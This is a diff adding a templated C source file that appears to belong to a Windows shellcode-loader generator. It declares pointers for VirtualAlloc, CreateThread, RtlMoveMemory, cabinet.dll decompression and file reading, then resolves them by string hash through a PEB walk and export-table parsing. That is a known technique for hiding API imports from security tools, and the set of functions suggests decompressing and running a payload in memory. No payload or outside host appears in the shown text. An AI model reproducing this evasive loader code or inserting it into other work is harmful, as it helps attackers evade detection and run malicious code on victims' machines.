@@ -1,0 +1,148 @@
+// --- Typedefs and Global Pointers ---
+typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
+typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T);
+typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
+typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
+typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
+typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
+typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
+typedef BOOL (WINAPI *pCreateDecompressor)(DWORD, PVOID, PDECOMPRESSOR_HANDLE);
+typedef BOOL (WINAPI *pDecompress)(DECOMPRESSOR_HANDLE, LPCVOID, SIZE_T, PVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI *pCloseDecompressor)(DECOMPRESSOR_HANDLE);
+typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
+typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+
+pVirtualAlloc pfnVirtualAlloc;
+pCreateThread pfnCreateThread;
+pRtlMoveMemory pfnRtlMoveMemory;
+pWaitForSingleObject pfnWaitForSingleObject;
+pCloseHandle pfnCloseHandle;
+pCreateFileMappingW pfnCreateFileMappingW;
+pMapViewOfFile pfnMapViewOfFile;
+pGetProcessHeap pfnGetProcessHeap;
+pHeapAlloc pfnHeapAlloc;
+pHeapFree pfnHeapFree;
+pCreateDecompressor pfnCreateDecompressor;
+pDecompress pfnDecompress;
+pCloseDecompressor pfnCloseDecompressor;
+pLoadLibraryA pfnLoadLibraryA;
+pCreateFileA pfnCreateFileA;
+pGetFileSize pfnGetFileSize;
+pReadFile pfnReadFile;
+
+DWORD HashString(const char* str) {
+    DWORD hash = 5381;
+    int c;
+    while ((c = *str++)) {
+        hash = ((hash << 5) + hash) + c; // hash * 33 + c
+    }
+    return hash;
+}
+
+HMODULE GetModuleHandleByHash(DWORD dwModuleNameHash) {
+    if (dwModuleNameHash == 0) return NULL;
+
+#ifdef _WIN64
+    PPEB pPeb = (PEB*)(__readgsqword(0x60));
+#else
+    PPEB pPeb = (PEB*)(__readfsdword(0x30));
+#endif
+
+    PPEB_LDR_DATA pLdr = pPeb->Ldr;
+    PLIST_ENTRY listHead = &(pLdr->InMemoryOrderModuleList);
+    PLIST_ENTRY currentEntry = listHead->Flink;
+
+    while (currentEntry != listHead) {
+        PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+        if (pDte->FullDllName.Length > 0) {
+            char upperDllName[MAX_PATH];
+            DWORD i = 0;
+            while (pDte->FullDllName.Buffer[i] && i < MAX_PATH - 1) {
+                char c = (char)pDte->FullDllName.Buffer[i];
+                if (c >= 'a' && c <= 'z') {
+                    upperDllName[i] = c - 32;
+                } else {
+                    upperDllName[i] = c;
+                }
+                i++;
+            }
+            upperDllName[i] = '\0';
+            
+            char* last_slash = strrchr(upperDllName, '\\');
+            char* module_name = last_slash ? last_slash + 1 : upperDllName;
+
+            if (HashString(module_name) == dwModuleNameHash) {
+                return (HMODULE)pDte->DllBase;
+            }
+        }
+        currentEntry = currentEntry->Flink;
+    }
+    return NULL;
+}
+
+FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwApiNameHash) {
+    if (hModule == NULL || dwApiNameHash == 0) return NULL;
+    PBYTE pBase = (PBYTE)hModule;
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    
+    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+        if (dwApiNameHash == HashString(pFunctionName)) {
+            return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+        }
+    }
+    return NULL;
+}
+
+void ResolveAPIs() {
+    DWORD KERNEL32_HASH = {{ hash_kernel32_dll }};
+    DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
+    DWORD CABINET_HASH = {{ hash_cabinet_dll }};
+    DEBUG_PRINT("ResolveAPIs: Running GetModuleHandleByHash");
+    HMODULE hKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
+    HMODULE hNtdll = GetModuleHandleByHash(NTDLL_HASH);
+    
+    pfnLoadLibraryA = (pLoadLibraryA)GetProcAddressByHash(hKernel32, {{ hash_loadlibrarya }});
+    pfnVirtualAlloc = (pVirtualAlloc)GetProcAddressByHash(hKernel32, {{ hash_virtualalloc }});
+    pfnCreateThread = (pCreateThread)GetProcAddressByHash(hKernel32, {{ hash_createthread }});
+    pfnWaitForSingleObject = (pWaitForSingleObject)GetProcAddressByHash(hKernel32, {{ hash_waitforsingleobject }});
+    pfnCloseHandle = (pCloseHandle)GetProcAddressByHash(hKernel32, {{ hash_closehandle }});
+    pfnCreateFileMappingW = (pCreateFileMappingW)GetProcAddressByHash(hKernel32, {{ hash_createfilemappingw }});
+    pfnMapViewOfFile = (pMapViewOfFile)GetProcAddressByHash(hKernel32, {{ hash_mapviewoffile }});
+    pfnGetProcessHeap = (pGetProcessHeap)GetProcAddressByHash(hKernel32, {{ hash_getprocessheap }});
+    pfnHeapAlloc = (pHeapAlloc)GetProcAddressByHash(hNtdll, {{ hash_rtlallocateheap }});
+    pfnHeapFree = (pHeapFree)GetProcAddressByHash(hKernel32, {{ hash_heapfree }});
+    pfnCreateFileA = (pCreateFileA)GetProcAddressByHash(hKernel32, {{ hash_createfilea }});
+    pfnGetFileSize = (pGetFileSize)GetProcAddressByHash(hKernel32, {{ hash_getfilesize }});
+    pfnReadFile = (pReadFile)GetProcAddressByHash(hKernel32, {{ hash_readfile }});
+
+    if (hNtdll != NULL) {
+        pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
+    }
+
+    HMODULE hCabinet = GetModuleHandleByHash(CABINET_HASH);
+    if (hCabinet == NULL && pfnLoadLibraryA != NULL) {
+        hCabinet = pfnLoadLibraryA("cabinet.dll");
+    } 
+    if (hCabinet != NULL) {
+        pfnCreateDecompressor = (pCreateDecompressor)GetProcAddressByHash(hCabinet, {{ hash_createdecompressor }});
+        pfnDecompress = (pDecompress)GetProcAddressByHash(hCabinet, {{ hash_decompress }});
+        pfnCloseDecompressor = (pCloseDecompressor)GetProcAddressByHash(hCabinet, {{ hash_closedecompressor }});
+    }
+
+    DEBUG_PRINT("API functions resolved by hash.");
+}
